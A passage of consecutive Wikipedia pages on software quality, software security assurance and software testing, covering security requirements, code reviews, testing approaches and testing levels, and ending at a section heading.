Martin, R. (2001), Managing vulnerabilities in networked systems, IEEE Computer.
McCabe, T. (December 1976), A complexity measure. IEEE Transactions on Software Engineering
McConnell, Steve (1993), Code Complete (First ed.), Microsoft Press
Nygard, M.T. (2007), Release It! Design and Deploy Production Ready Software, The Pragmatic Programmers.
Park, R.E. (1992), Software Size Measurement: A Framework for Counting Source Statements. (CMU/SEI-92-TR-020)., Software Engineering Institute, Carnegie Mellon University
Pressman, Roger S. (2005). Software Engineering: A Practitioner's Approach (Sixth International ed.). McGraw-Hill Education. ISBN 0071267824.
Spinellis, D. (2006), Code Quality, Addison Wesley

External links[edit]



Wikimedia Commons has media related to Software quality.

When code is king: Mastering automotive software excellence (McKinsey, 2021)
Embedded System Software Quality: Why is it so often terrible? What can we do about it? (by Philip Koopman)
Code Quality Standards by CISQ™
CISQ Blog: https://blog.it-cisq.org
Guide to software quality assurance (ESA)
Guide to applying the ESA software engineering standards to small software projects (ESA)
An Overview of ESA Software Product Assurance Services (NASA/ESA)
Our approach to quality in Volkswagen Software Dev Center Lisbon
Google Style Guides
Ensuring Product Quality at Google (2011)
NASA Software Assurance
NIST Software Quality Group
OMG/CISQ Automated Function Points (ISO/IEC 19515)
OMG Automated Technical Debt Standard
Automated Quality Assurance (articled in IREB by Harry Sneed)
Structured Testing: A Testing Methodology Using the Cyclomatic Complexity Metric (1996)
Analyzing Application Quality by Using Code Analysis Tools (Microsoft, Documentation, Visual Studio, 2016)
vteSoftware qualityQualitiesInternal
Size
Maintainability
Flexibility
Portability
Reusability
Readability
Scalability
Testability
Understandability
Loose coupling
Orthogonality
External
Usability
Reliability
Adaptability
Correctness
Accuracy
Efficiency
Robustness
Security
Safety
Standards and lists
ISO/IEC 9126
Non-functional requirements
List of system quality attributes
Processes
Software quality management
Software quality control
Software quality assurance


 Commons

vteSoftware engineeringFields
Computer programming
DevOps
Requirements engineering
Site reliability engineering
Software deployment
Software design
Software maintenance
Software testing
Systems analysis
Formal methods
Concepts
Data modeling
Enterprise architecture
Functional specification
Modeling language
Programming paradigm
Software
Software archaeology
Software architecture
Software configuration management
Software development process/methodology
Software quality
Software quality assurance
Software verification and validation
Structured analysis
Essential Analysis
CI/CD
Orientations
Agile
Aspect-oriented
Object orientation
Ontology
Service orientation
SDLC
ModelsDevelopmental
Agile
EUP
Executable UML
Incremental model
Iterative model
Prototype model
RAD
UP
Scrum
Spiral model
V-Model
Waterfall model
XP
Other
SPICE
CMMI
Data model
ER model
Function model
Information model
Metamodeling
Object model
Systems model
View model
Languages
IDEF
UML
USL
SysML
Related fields
Computer science
Computer engineering
Information science
Project management
Risk management
Systems engineering

 Commons
 Category

vteComputer scienceNote: This template roughly follows the 2012 ACM Computing Classification System.Hardware
Printed circuit board
Peripheral
Integrated circuit
Very Large Scale Integration
Systems on Chip (SoCs)
Energy consumption (Green computing)
Electronic design automation
Hardware acceleration
Computer systems organization
Computer architecture
Embedded system
Real-time computing
Dependability
Networks
Network architecture
Network protocol
Network components
Network scheduler
Network performance evaluation
Network service
Software organization
Interpreter
Middleware
Virtual machine
Operating system
Software quality
Software notations and tools
Programming paradigm
Programming language
Compiler
Domain-specific language
Modeling language
Software framework
Integrated development environment
Software configuration management
Software library
Software repository
Software development
Control variable
Software development process
Requirements analysis
Software design
Software construction
Software deployment
Software engineering
Software maintenance
Programming team
Open-source model
Theory of computation
Model of computation
Formal language
Automata theory
Computability theory
Computational complexity theory
Logic
Semantics
Algorithms
Algorithm design
Analysis of algorithms
Algorithmic efficiency
Randomized algorithm
Computational geometry
Mathematics of computing
Discrete mathematics
Probability
Statistics
Mathematical software
Information theory
Mathematical analysis
Numerical analysis
Theoretical computer science
Information systems
Database management system
Information storage systems
Enterprise information system
Social information systems
Geographic information system
Decision support system
Process control system
Multimedia information system
Data mining
Digital library
Computing platform
Digital marketing
World Wide Web
Information retrieval
Security
Cryptography
Formal methods
Security services
Intrusion detection system
Hardware security
Network security
Information security
Application security
Human–computer interaction
Interaction design
Social computing
Ubiquitous computing
Visualization
Accessibility
Synthography
Concurrency
Concurrent computing
Parallel computing
Distributed computing
Multithreading
Multiprocessing
Artificial intelligence
Natural language processing
Knowledge representation and reasoning
Computer vision
Automated planning and scheduling
Search methodology
Control method
Philosophy of artificial intelligence
Distributed artificial intelligence
Machine learning
Supervised learning
Unsupervised learning
Reinforcement learning
Multi-task learning
Cross-validation
Graphics
Animation
Rendering
Image manipulation
Graphics processing unit
Mixed reality
Virtual reality
Image compression
Solid modeling
Applied computing
E-commerce
Enterprise software
Computational mathematics
Computational physics
Computational chemistry
Computational biology
Computational social science
Computational engineering
Computational healthcare
Digital art
Electronic publishing
Cyberwarfare
Electronic voting
Video games
Word processing
Operations research
Educational technology
Document management

 Category
 Outline
WikiProject
 Commons





Retrieved from "https://en.wikipedia.org/w/index.php?title=Software_quality&oldid=1136144720"
Categories: Software qualitySystems thinkingSoftware testingSource codeHidden categories: CS1 maint: numeric names: authors listWebarchive template wayback linksCS1 maint: url-statusCS1 maint: othersArticles with short descriptionShort description matches WikidataArticles needing additional references from December 2021All articles needing additional referencesAll articles with unsourced statementsArticles with unsourced statements from February 2021Commons category link from Wikidata
 



From Wikipedia, the free encyclopedia


This article has multiple issues. Please help improve it or discuss these issues on the talk page. (Learn how and when to remove these template messages)

This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Software security assurance" – news · newspapers · books · scholar · JSTOR (December 2010) (Learn how and when to remove this template message)
This article is written like a manual or guidebook. Please help rewrite this article from a descriptive, neutral point of view, and remove advice or instruction. (June 2014) (Learn how and when to remove this template message)

 (Learn how and when to remove this template message)
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Software security assurance is a process that helps design and implement software that protects the data and resources contained in and controlled by that software. Software is itself a resource and thus must be afforded appropriate security.


What is software security assurance?[edit]
Software Security Assurance (SSA) is the process of ensuring that software is designed to operate at a level of security that is consistent with the potential harm that could result from the loss, inaccuracy, alteration, unavailability, or misuse of the data and resources that it uses, controls, and protects.[1]
The software security assurance process begins by identifying and categorizing the information that is to be contained in, or used by, the software. The information should be categorized according to its sensitivity. For example, in the lowest category, the impact of a security violation is minimal (i.e. the impact on the software owner's mission, functions, or reputation is negligible). For a top category, however, the impact may pose a threat to human life; may have an irreparable impact on software owner's missions, functions, image, or reputation; or may result in the loss of significant assets or resources.
Once the information is categorized, security requirements can be developed. The security requirements should address access control, including network access and physical access; data management and data access; environmental controls (power, air conditioning, etc.) and off-line storage; human resource security; and audit trails and usage records.

What causes software security problems?[edit]
All security vulnerabilities in software are the result of security bugs, or defects, within the software. In most cases, these defects are created by two primary causes: (1) non-conformance, or a failure to satisfy requirements; and (2) an error or omission in the software requirements.

Non-conformance, or a failure to satisfy requirements[edit]
A non-conformance may be simple–the most common is a coding error or defect–or more complex (i.e., a subtle timing error or input validation error). The important point about non-conformance is that verification and validation techniques are designed to detect them and security assurance techniques are designed to prevent them. Improvements in these methods, through a software security assurance program, can improve the security of software.

Errors or omissions in software requirements[edit]
The most serious security problems with software-based systems are those that develop when the software requirements are incorrect, inappropriate, or incomplete for the system situation. Unfortunately, errors or omissions in requirements are more difficult to identify. For example, the software may perform exactly as required under normal use, but the requirements may not correctly deal with some system state. When the system enters this problem state, unexpected and undesirable behavior may result. This type of problem cannot be handled within the software discipline; it results from a failure of the system and software engineering processes which developed and allocated the system requirements to the software.

Software security assurance activities[edit]
There are two basic types of Software Security Assurance activities.

Some focus on ensuring that information processed by an information system is assigned a proper sensitivity category, and that the appropriate protection requirements have been developed and met in the system.
Others focus on ensuring the control and protection of the software, as well as that of the software support tools and data.
At a minimum, a software security assurance program should ensure that:

A security evaluation has been performed for the software.
Security requirements have been established for the software.
Security requirements have been established for the software development and/or operations and maintenance (O&M) processes.
Each software review, or audit, includes an evaluation of the security requirements.
A configuration management and corrective action process is in place to provide security for the existing software and to ensure that any proposed changes do not inadvertently create security violations or vulnerabilities.
Physical security for the software is adequate.
Building in security[edit]
Improving the software development process and building better software are ways to improve software security, by producing software with fewer defects and vulnerabilities. A first-order approach is to identify the critical software components that control security-related functions and pay special attention to them throughout the development and testing process. This approach helps to focus scarce security resources on the most critical areas.

Tools and techniques[edit]
There are many commercial off-the-shelf (COTS) software packages that are available to support software security assurance activities. However, before they are used, these tools must be carefully evaluated and their effectiveness must be assured.

Common weaknesses enumeration[edit]
One way to improve software security is to gain a better understanding of the most common weaknesses that can affect software security. With that in mind, there is a current community-based program called the Common Weaknesses Enumeration project,[2] which is sponsored by The Mitre Corporation to identify and describe such weaknesses. The list, which is currently in a very preliminary form, contains descriptions of common software weaknesses, faults, and flaws.

Security architecture/design analysis[edit]
Security architecture/design analysis verifies that the software design correctly implements security requirements. Generally speaking, there are four basic techniques that are used for security architecture/design analysis.
[3][4]

Logic analysis[edit]
Logic analysis evaluates the equations, algorithms, and control logic of the software design.

Data analysis[edit]
Data analysis evaluates the description and intended usage of each data item used in design of the software component. The use of interrupts and their effect on data should receive special attention to ensure interrupt handling routines do not alter critical data used by other routines.

Interface analysis[edit]
Interface analysis verifies the proper design of a software component's interfaces with other components of the system, including computer hardware, software, and end-users.

Constraint analysis[edit]
Constraint analysis evaluates the design of a software component against restrictions imposed by requirements and real-world limitations. The design must be responsive to all known or anticipated restrictions on the software component. These restrictions may include timing, sizing, and throughput constraints, input and output data limitations, equation and algorithm limitations, and other design limitations.

Secure code reviews, inspections, and walkthroughs[edit]
Code analysis verifies that the software source code is written correctly, implements the desired design, and does not violate any security requirements. Generally speaking, the techniques used in the performance of code analysis mirror those used in design analysis.
Secure Code reviews are conducted during and at the end of the development phase to determine whether established security requirements, security design concepts, and security-related specifications have been satisfied. These reviews typically consist of the presentation of material to a review group. Secure code reviews are most effective when conducted by personnel who have not been directly involved in the development of the software being reviewed.

Informal reviews[edit]
Informal secure code reviews can be conducted on an as-needed basis. To conduct an informal review, the developer simply selects one or more reviewer(s) and provides and/or presents the material to be reviewed. The material may be as informal as pseudo-code or hand-written documentation.

Formal reviews[edit]
Formal secure code reviews are conducted at the end of the development phase for each software component. The client of the software appoints the formal review group, who may make or affect a "go/no-go" decision to proceed to the next step of the software development life cycle.

Inspections and walkthroughs[edit]
A secure code inspection or walkthrough is a detailed examination of a product on a step-by-step or line-by-line (of source code) basis. The purpose of conducting secure code inspections or walkthroughs is to find errors. Typically, the group that does an inspection or walkthrough is composed of peers from development, security engineering and quality assurance.

Security testing[edit]
Software security testing, which includes penetration testing, confirms the results of design and code analysis, investigates software behaviour, and verifies that the software complies with security requirements. Special security testing, conducted in accordance with a security test plan and procedures, establishes the compliance of the software with the security requirements. Security testing focuses on locating software weaknesses and identifying extreme or unexpected situations that could cause the software to fail in ways that would cause a violation of security requirements. Security testing efforts are often limited to the software requirements that are classified as "critical" security items.

See also[edit]
Secure by design
Computer security
Security engineering
Software protection
References[edit]


^ Goertzel, Karen M.; Winograd, Theodore; McKinley, Holly L.; Oh, Lyndon J.; Colon, Michael; McGibbon, Thomas; Fedchak, Elaine; Vienneau, Robert (2007-07-31). "Software Security Assurance: A State-of-Art Report (SAR)". Fort Belvoir, VA. doi:10.21236/ada472363. {{cite journal}}: Cite journal requires |journal= (help)

^ "Common Weaknesses Enumeration Project". Retrieved 26 August 2010.

^ Web Application Security Testing

^ "A Catalog of Security Architecture Weaknesses". 2017 IEEE International Conference on Software Architecture (ICSA). doi:10.1109/ICSAW.2017.25.






Retrieved from "https://en.wikipedia.org/w/index.php?title=Software_security_assurance&oldid=1135832561"
Categories: Security engineeringSoftware qualityHidden categories: CS1 errors: missing periodicalArticles needing additional references from December 2010All articles needing additional referencesWikipedia articles with style issues from June 2014All articles with style issuesArticles with multiple maintenance issues
 



From Wikipedia, the free encyclopedia


Process of examining software behavior and artifacts


Part of a series onSoftware development
Core activities
Processes
Requirements
Design
Construction
Engineering
Testing
Debugging
Deployment
Maintenance

Paradigms and models
Software engineering
Agile
Cleanroom
Incremental
Prototyping
Spiral
V model
Waterfall

Methodologies and frameworks
ASD
DevOps
DAD
DSDM
FDD
IID
Kanban
Lean SD
LeSS
MDD
MSF
PSP
RAD
RUP
SAFe
Scrum
SEMAT
TDD
TSP
OpenUP
UP
XP

Supporting disciplines
Configuration management
Documentation
Software quality assurance
Project management
User experience

Practices
ATDD
BDD
CCO
CI
CD
DDD
PP
SBE
Stand-up
TDD

Tools
Compiler
Debugger
Profiler
GUI designer
Modeling
IDE
Build automation
Release automation
Infrastructure as code

Standards and bodies of knowledge
BABOK
CMMI
IEEE standards
ISO 9001
ISO/IEC standards
PMBOK
SWEBOK
ITIL
IREB

Glossaries
Artificial intelligence
Computer science
Electrical and electronics engineering

Outlines
Outline of software development
vte
Software testing is the act of examining the artifacts and the behavior of the software under test by validation and verification. Software testing can also provide an objective, independent view of the software to allow the business to appreciate and understand the risks of software implementation. Test techniques include, but not necessarily limited to:

analyzing the product requirements for completeness and correctness in various contexts like industry perspective, business perspective, feasibility and viability of implementation, usability, performance, security, infrastructure considerations, etc.
reviewing the product architecture and the overall design of the product
working with product developers on improvement in coding techniques, design patterns, tests that can be written as part of code based on various techniques like boundary conditions, etc.
executing a program or application with the intent of examining behavior
reviewing the deployment infrastructure and associated scripts and automation
take part in production activities by using monitoring and observability techniques
Software testing can provide objective, independent information about the quality of software and risk of its failure to users or sponsors.[1]
Software testing can determine the correctness of software under the assumption of some specific hypotheses (see the hierarchy of testing difficulty below), testing cannot identify all the failures within the software.[2] Instead, it furnishes a criticism or comparison that compares the state and behavior of the product against test oracles — principles or mechanisms by which someone might recognize a problem. These oracles may include (but are not limited to) specifications, contracts,[3] comparable products, past versions of the same product, inferences about intended or expected purpose, user or customer expectations, relevant standards, applicable laws, or other criteria.
A primary purpose of testing is to detect software failures so that defects may be discovered and corrected. Testing cannot establish that a product functions properly under all conditions, but only that it does not function properly under specific conditions.[4] The scope of software testing may include the examination of code as well as the execution of that code in various environments and conditions as well as examining the aspects of code: does it do what it is supposed to do and do what it needs to do. In the current culture of software development, a testing organization may be separate from the development team. There are various roles for testing team members. Information derived from software testing may be used to correct the process by which software is developed.[5]: 41–43 
Every software product has a target audience. For example, the audience for video game software is completely different from banking software. Therefore, when an organization develops or otherwise invests in a software product, it can assess whether the software product will be acceptable to its end users, its target audience, its purchasers, and other stakeholders. Software testing assists in making this assessment.


Faults and failures[edit]
Software faults occur through the following process: A programmer makes an error (mistake), which results in a fault (defect, bug) in the software source code. If this fault is executed, in certain situations the system will produce wrong results, causing a failure.[6]: 31 
Not all faults will necessarily result in failures. For example, faults in the dead code will never result in failures. A fault that did not reveal failures may result in a failure when the environment is changed. Examples of these changes in environment include the software being run on a new computer hardware platform, alterations in source data, or interacting with different software.[7] A single fault may result in a wide range of failure symptoms.
Not all software faults are caused by coding errors. One common source of expensive defects is requirement gaps, that is, unrecognized requirements that result in errors of omission by the program designer.[5]: 426  Requirement gaps can often be non-functional requirements such as testability, scalability, maintainability, performance, and security.

Input combinations and preconditions[edit]
A fundamental problem with software testing is that testing under all combinations of inputs and preconditions (initial state) is not feasible, even with a simple product.[4]: 17–18 [8] This means that the number of faults in a software product can be very large and defects that occur infrequently are difficult to find in testing and debugging. More significantly, non-functional dimensions of quality (how it is supposed to be versus what it is supposed to do) — usability, scalability, performance, compatibility, and reliability — can be highly subjective; something that constitutes sufficient value to one person may be intolerable to another.
Software developers can't test everything, but they can use combinatorial test design to identify the minimum number of tests needed to get the coverage they want. Combinatorial test design enables users to get greater test coverage with fewer tests. Whether they are looking for speed or test depth, they can use combinatorial test design methods to build structured variation into their test cases.[9]

Economics[edit]
A study conducted by NIST in 2002 reports that software bugs cost the U.S. economy $59.5 billion annually. More than a third of this cost could be avoided, if better software testing was performed.[10][dubious  – discuss]
Outsourcing software testing because of costs is very common, with China, the Philippines, and India, being preferred destinations.[11]

Roles[edit]
Software testing can be done by dedicated software testers; until the 1980s, the term "software tester" was used generally, but later it was also seen as a separate profession. Regarding the periods and the different goals in software testing,[12] different roles have been established, such as test manager, test lead, test analyst, test designer, tester, automation developer, and test administrator. Software testing can also be performed by non-dedicated software testers.[13]

History[edit]
Glenford J. Myers initially introduced the separation of debugging from testing in 1979.[14] Although his attention was on breakage testing ("A successful test case is one that detects an as-yet undiscovered error."[14]: 16 ), it illustrated the desire of the software engineering community to separate fundamental development activities, such as debugging, from that of verification.

Testing approach[edit]
Static, dynamic, and passive testing[edit]
There are many approaches available in software testing. Reviews, walkthroughs, or inspections are referred to as static testing, whereas executing programmed code with a given set of test cases is referred to as dynamic testing.[15][16]
Static testing is often implicit, like proofreading, plus when programming tools/text editors check source code structure or compilers (pre-compilers) check syntax and data flow as static program analysis. Dynamic testing takes place when the program itself is run. Dynamic testing may begin before the program is 100% complete in order to test particular sections of code and are applied to discrete functions or modules.[15][16] Typical techniques for these are either using stubs/drivers or execution from a debugger environment.[16]
Static testing involves verification, whereas dynamic testing also involves validation.[16]
Passive testing means verifying the system behavior without any interaction with the software product. Contrary to active testing, testers do not provide any test data but look at system logs and traces. They mine for patterns and specific behavior in order to make some kind of decisions.[17] This is related to offline runtime verification and log analysis.

Exploratory approach[edit]
Exploratory testing is an approach to software testing that is concisely described as simultaneous learning, test design, and test execution. Cem Kaner, who coined the term in 1984,[18]: 2  defines exploratory testing as "a style of software testing that emphasizes the personal freedom and responsibility of the individual tester to continually optimize the quality of his/her work by treating test-related learning, test design, test execution, and test result interpretation as mutually supportive activities that run in parallel throughout the project."[18]: 36 

The "box" approach[edit]
Software testing methods are traditionally divided into white- and black-box testing. These two approaches are used to describe the point of view that the tester takes when designing test cases. A hybrid approach called grey-box testing may also be applied to software testing methodology.[19][20] With the concept of grey-box testing—which develops tests from specific design elements—gaining prominence, this "arbitrary distinction" between black- and white-box testing has faded somewhat.[21]

White-box testing[edit]
Main article: White-box testing
 White Box Testing Diagram
White-box testing (also known as clear box testing, glass box testing, transparent box testing, and structural testing) verifies the internal structures or workings of a program, as opposed to the functionality exposed to the end-user. In white-box testing, an internal perspective of the system (the source code), as well as programming skills, are used to design test cases. The tester chooses inputs to exercise paths through the code and determine the appropriate outputs.[19][20] This is analogous to testing nodes in a circuit, e.g., in-circuit testing (ICT).
While white-box testing can be applied at the unit, integration, and system levels of the software testing process, it is usually done at the unit level.[21] It can test paths within a unit, paths between units during integration, and between subsystems during a system–level test. Though this method of test design can uncover many errors or problems, it might not detect unimplemented parts of the specification or missing requirements.
Techniques used in white-box testing include:[20][22]

API testing – testing of the application using public and private APIs (application programming interfaces)
Code coverage – creating tests to satisfy some criteria of code coverage (for example, the test designer can create tests to cause all statements in the program to be executed at least once)
Fault injection methods – intentionally introducing faults to gauge the efficacy of testing strategies
Mutation testing methods
Static testing methods
Code coverage tools can evaluate the completeness of a test suite that was created with any method, including black-box testing. This allows the software team to examine parts of a system that are rarely tested and ensures that the most important function points have been tested.[23] Code coverage as a software metric can be reported as a percentage for:[19][23][24]

Function coverage, which reports on functions executed
Statement coverage, which reports on the number of lines executed to complete the test
Decision coverage, which reports on whether both the True and the False branch of a given test has been executed
100% statement coverage ensures that all code paths or branches (in terms of control flow) are executed at least once. This is helpful in ensuring correct functionality, but not sufficient since the same code may process different inputs correctly or incorrectly.[25]

Black-box testing[edit]
Main article: Black-box testing
 Black box diagram
Black-box testing (also known as functional testing) treats the software as a "black box," examining functionality without any knowledge of internal implementation, without seeing the source code. The testers are only aware of what the software is supposed to do, not how it does it.[26] Black-box testing methods include: equivalence partitioning, boundary value analysis, all-pairs testing, state transition tables, decision table testing, fuzz testing, model-based testing, use case testing, exploratory testing, and specification-based testing.[19][20][24]
Specification-based testing aims to test the functionality of software according to the applicable requirements.[27] This level of testing usually requires thorough test cases to be provided to the tester, who then can simply verify that for a given input, the output value (or behavior), either "is" or "is not" the same as the expected value specified in the test case.
Test cases are built around specifications and requirements, i.e., what the application is supposed to do. It uses external descriptions of the software, including specifications, requirements, and designs to derive test cases. These tests can be functional or non-functional, though usually functional.
Specification-based testing may be necessary to assure correct functionality, but it is insufficient to guard against complex or high-risk situations.[28]
One advantage of the black box technique is that no programming knowledge is required. Whatever biases the programmers may have had, the tester likely has a different set and may emphasize different areas of functionality. On the other hand, black-box testing has been said to be "like a walk in a dark labyrinth without a flashlight."[29] Because they do not examine the source code, there are situations when a tester writes many test cases to check something that could have been tested by only one test case or leaves some parts of the program untested.
This method of test can be applied to all levels of software testing: unit, integration, system and acceptance.[21] It typically comprises most if not all testing at higher levels, but can also dominate unit testing as well.
Component interface testing
Component interface testing is a variation of black-box testing, with the focus on the data values beyond just the related actions of a subsystem component.[30] The practice of component interface testing can be used to check the handling of data passed between various units, or subsystem components, beyond full integration testing between those units.[31][32] The data being passed can be considered as "message packets" and the range or data types can be checked, for data generated from one unit, and tested for validity before being passed into another unit. One option for interface testing is to keep a separate log file of data items being passed, often with a timestamp logged to allow analysis of thousands of cases of data passed between units for days or weeks. Tests can include checking the handling of some extreme data values while other interface variables are passed as normal values.[31] Unusual data values in an interface can help explain unexpected performance in the next unit.

Visual testing[edit]
The aim of visual testing is to provide developers with the ability to examine what was happening at the point of software failure by presenting the data in such a way that the developer can easily find the information she or he requires, and the information is expressed clearly.[33][34]
At the core of visual testing is the idea that showing someone a problem (or a test failure), rather than just describing it, greatly increases clarity and understanding. Visual testing, therefore, requires the recording of the entire test process – capturing everything that occurs on the test system in video format. Output videos are supplemented by real-time tester input via picture-in-a-picture webcam and audio commentary from microphones.
Visual testing provides a number of advantages. The quality of communication is increased drastically because testers can show the problem (and the events leading up to it) to the developer as opposed to just describing it and the need to replicate test failures will cease to exist in many cases. The developer will have all the evidence she or he requires of a test failure and can instead focus on the cause of the fault and how it should be fixed.
Ad hoc testing and exploratory testing are important methodologies for checking software integrity, because they require less preparation time to implement, while the important bugs can be found quickly.[35] In ad hoc testing, where testing takes place in an improvised, impromptu way, the ability of the tester(s) to base testing off documented methods and then improvise variations of those tests can result in more rigorous examination of defect fixes.[35] However, unless strict documentation of the procedures are maintained, one of the limits of ad hoc testing is lack of repeatability.[35]

Further information: Graphical user interface testing
Grey-box testing[edit]
Main article: Gray box testing
Grey-box testing (American spelling: gray-box testing) involves having knowledge of internal data structures and algorithms for purposes of designing tests while executing those tests at the user, or black-box level. The tester will often have access to both "the source code and the executable binary."[36] Grey-box testing may also include reverse engineering (using dynamic code analysis) to determine, for instance, boundary values or error messages.[36] Manipulating input data and formatting output do not qualify as grey-box, as the input and output are clearly outside of the "black box" that we are calling the system under test. This distinction is particularly important when conducting integration testing between two modules of code written by two different developers, where only the interfaces are exposed for the test.
By knowing the underlying concepts of how the software works, the tester makes better-informed testing choices while testing the software from outside. Typically, a grey-box tester will be permitted to set up an isolated testing environment with activities such as seeding a database. The tester can observe the state of the product being tested after performing certain actions such as executing SQL statements against the database and then executing queries to ensure that the expected changes have been reflected. Grey-box testing implements intelligent test scenarios, based on limited information. This will particularly apply to data type handling, exception handling, and so on.[37]

Testing levels[edit]
Broadly speaking, there are at least three levels of testing: unit testing, integration testing, and system testing.[38][39][40][41] However, a fourth level, acceptance testing, may be included by developers. This may be in the form of operational acceptance testing or be simple end-user (beta) testing, testing to ensure the software meets functional expectations.[42][43][44] Based on the ISTQB Certified Test Foundation Level syllabus, test levels includes those four levels, and the fourth level is named acceptance testing.[45] Tests are frequently grouped into one of these levels by where they are added in the software development process, or by the level of specificity of the test.

Unit testing[edit]
Main article: Unit testing
Unit testing refers to tests that verify the functionality of a specific section of code, usually at the function level. In an object-oriented environment, this is usually at the class level, and the minimal unit tests include the constructors and destructors.[46]
These types of tests are usually written by developers as they work on code (white-box style), to ensure that the specific function is working as expected. One function might have multiple tests, to catch corner cases or other branches in the code. Unit testing alone cannot verify the functionality of a piece of software, but rather is used to ensure that the building blocks of the software work independently from each other.
Unit testing is a software development process that involves a synchronized application of a broad spectrum of defect prevention and detection strategies in order to reduce software development risks, time, and costs. It is performed by the software developer or engineer during the construction phase of the software development life cycle. Unit testing aims to eliminate construction errors before code is promoted to additional testing; this strategy is intended to increase the quality of the resulting software as well as the efficiency of the overall development process.
Depending on the organization's expectations for software development, unit testing might include static code analysis, data-flow analysis, metrics analysis, peer code reviews, code coverage analysis and other software testing practices.

Integration testing[edit]
Main article: Integration testing
Integration testing is any type of software testing that seeks to verify the interfaces between components against a software design. Software components may be integrated in an iterative way or all together ("big bang"). Normally the former is considered a better practice since it allows interface issues to be located more quickly and fixed.
Integration testing works to expose defects in the interfaces and interaction between integrated components (modules). Progressively larger groups of tested software components corresponding to elements of the architectural design are integrated and tested until the software works as a system.[47]

System testing[edit]
Main article: System testing
System testing tests a completely integrated system to verify that the system meets its requirements.[6]: 74  For example, a system test might involve testing a login interface, then creating and editing an entry, plus sending or printing results, followed by summary processing or deletion (or archiving) of entries, then logoff.

Acceptance testing[edit]
Main article: Acceptance testing
Acceptance testing commonly includes the following four types:[45]

User acceptance testing (UAT)
Operational acceptance testing (OAT)
Contractual and regulatory acceptance testing
Alpha and beta testing
UAT as well as alpha and beta testing are described in the next testing types section.
Operational acceptance is used to conduct operational readiness (pre-release) of a product, service or system as part of a quality management system. OAT is a common type of non-functional software testing, used mainly in software development and software maintenance projects. This type of testing focuses on the operational readiness of the system to be supported, or to become part of the production environment. Hence, it is also known as operational readiness testing (ORT) or Operations readiness and assurance (OR&A) testing. Functional testing within OAT is limited to those tests that are required to verify the non-functional aspects of the system.
In addition, the software testing should ensure that the portability of the system, as well as working as expected, does not also damage or partially corrupt its operating environment or cause other processes within that environment to become inoperative.[48]
Contractual acceptance testing is performed based on the contract's acceptance criteria defined during the agreement of the contract, while regulatory acceptance testing is performed based on the relevant regulations to the software product. Both of these two testings can be performed by users or independent testers. Regulation acceptance testing sometimes involves the regulatory agencies auditing the test results.[45]

 Testing types, techniques and tactics[edit]
Different labels and ways of grouping testing may be testing types, software testing tactics or techniques.[49]

 TestingCup - Polish Championship in Software Testing, Katowice, May 2016
Installation testing[edit]
Main article: Installation testing
Most software systems have installation procedures that are needed before they can be used for their main purpose. Testing these procedures to achieve an installed software system that may be used is known as installation testing.

Compatibility testing[edit]
Main article: Compatibility testing
A common cause of software failure (real or perceived) is a lack of its compatibility with other application software, operating systems (or operating system versions, old or new), or target environments that differ greatly from the original (such as a terminal or GUI application intended to be run on the desktop now being required to become a Web application, which must render in a Web browser). For example, in the case of a lack of backward compatibility, this can occur because the programmers develop and test software only on the latest version of the target environment, which not all users may be running. This results in the unintended consequence that the latest work may not function on earlier versions of the target environment, or on older hardware that earlier versions of the target environment were capable of using. Sometimes such issues can be fixed by proactively abstracting operating system functionality into a separate program module or library.

Smoke and sanity testing[edit]
Main article: Smoke testing (software)
Sanity testing determines whether it is reasonable to proceed with further testing.
Smoke testing consists of minimal attempts to operate the software, designed to determine whether there are any basic problems that will prevent it from working at all. Such tests can be used as build verification test.

Regression testing[edit]
Main article: Regression testing
Regression testing focuses on finding defects after a major code change has occurred. Specifically, it seeks to uncover software regressions, as degraded or lost features, including old bugs that have come back. Such regressions occur whenever software functionality that was previously working correctly, stops working as intended. Typically, regressions occur as an unintended consequence of program changes, when the newly developed part of the software collides with the previously existing code. Regression testing is typically the largest test effort in commercial software development,[50] due to checking numerous details in prior software features, and even new software can be developed while using some old test cases to test parts of the new design to ensure prior functionality is still supported.
Common methods of regression testing include re-running previous sets of test cases and checking whether previously fixed faults have re-emerged. The depth of testing depends on the phase in the release process and the risk of the added features. They can either be complete, for changes added late in the release or deemed to be risky, or be very shallow, consisting of positive tests on each feature, if the changes are early in the release or deemed to be of low risk.

Acceptance testing[edit]
Main article: Acceptance testing
Acceptance testing can mean one of two things:

A smoke test is used as a build acceptance test prior to further testing, e.g., before integration or regression.
Acceptance testing performed by the customer, often in their lab environment on their own hardware, is known as user acceptance testing (UAT). Acceptance testing may be performed as part of the hand-off process between any two phases of development.[citation needed]
Alpha testing[edit]
Main article: Alpha testing
Alpha testing is simulated or actual operational testing by potential users/customers or an independent test team at the developers' site. Alpha testing is often employed for off-the-shelf software as a form of internal acceptance testing before the software goes to beta testing.[51]

Beta testing[edit]
See also: Software release life cycle § Beta
Beta testing comes after alpha testing and can be considered a form of external user acceptance testing. Versions of the software, known as beta versions, are released to a limited audience outside of the programming team known as beta testers. The software is released to groups of people so that further testing can ensure the product has few faults or bugs. Beta versions can be made available to the open public to increase the feedback field to a maximal number of future users and to deliver value earlier, for an extended or even indefinite period of time (perpetual beta).[52]

Functional vs non-functional testing[edit]
